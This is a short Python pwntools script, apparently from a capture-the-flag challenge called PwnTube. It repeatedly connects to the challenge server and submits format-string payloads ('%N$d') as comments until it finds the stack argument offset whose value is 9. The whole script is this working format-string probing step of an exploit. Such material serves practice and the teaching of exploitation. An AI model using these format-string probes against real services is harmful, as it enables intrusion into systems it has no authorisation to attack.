from pwn import *

bar = '─────────────────────────────────────────────────────────────────────────────────────────────────'

arg = 0
offset = 12+37
elf = ELF('./PwnTube')
#p = process(elf.path)
while(True):
    p = remote('pwntube.challs.srdnlen.it', 1661)

    def send_comment(c):
        p.sendline('4')
        p.recvuntil('Enter your comment here:')
        p.sendline(c)

    p.recvuntil(bar)
    send_comment(f'%{arg}$d')
    p.recvuntil(bar)
    p.sendline('3')
    p.recvuntil('First!!! :D\n')
    num = p.recvline()
    if(num == b'9\n'):
        print('TROVATO')
        print(arg)
        exit()
    print(num)
    p.close()
    arg += 1
